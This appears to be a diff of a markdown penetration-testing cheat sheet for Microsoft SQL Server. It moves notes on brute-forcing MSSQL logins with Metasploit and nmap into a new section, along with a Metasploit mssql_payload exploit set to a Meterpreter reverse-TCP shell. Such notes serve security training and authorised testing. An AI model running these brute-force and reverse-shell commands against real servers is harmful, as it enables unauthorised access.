@@ -314,16 +314,7 @@ Execute command:
 
 `msf > use auxiliary/scanner/mssql/mssql_ping` 
 
-#### Bruteforce MSSQL Login 
-
-`msf > use auxiliary/admin/mssql/mssql_login` 
-
-#### Metasploit MSSQL Shell 
-
-```text
-msf > use exploit/windows/mssql/mssql_payload 
-msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
-```
+#### 
 
 #### mssql\_enum  
 
@@ -518,5 +509,24 @@ It doesn’t return anything, but in the responder window, I’ve captured the n
 [*] Skipping previously captured hash for QUERIER\mssql-svc 
 ```
 
+## Bruteforce login
 
+### Metasploit
+
+#### Bruteforce MSSQL Login 
+
+`msf > use auxiliary/admin/mssql/mssql_login` 
+
+#### Metasploit MSSQL Shell 
+
+```text
+msf > use exploit/windows/mssql/mssql_payload 
+msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
+```
+
+### Nmap
+
+```text
+nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>
+```
 
